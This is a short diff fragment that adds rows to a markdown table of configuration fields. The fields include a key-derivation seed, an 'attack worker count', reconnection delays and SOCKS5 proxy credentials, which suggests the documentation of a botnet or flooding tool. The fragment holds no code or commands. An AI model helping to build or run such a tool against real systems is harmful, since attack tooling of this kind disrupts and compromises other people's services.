+| `configSeed` | 8-char hex seed for key derivation |
+| `verboseLog` | Debug mode flag |
+| `workerPool` | Attack worker count (2024) |
+| `bufferCap` | Buffer size (256) |
+| `retryFloor` / `retryCeil` | Reconnection delay range (4–7s) |
+| `proxyUser` / `proxyPass` | SOCKS5 proxy credentials |
+| `maxSessions` | Max concurrent SOCKS5 connections |
 
 ---
 
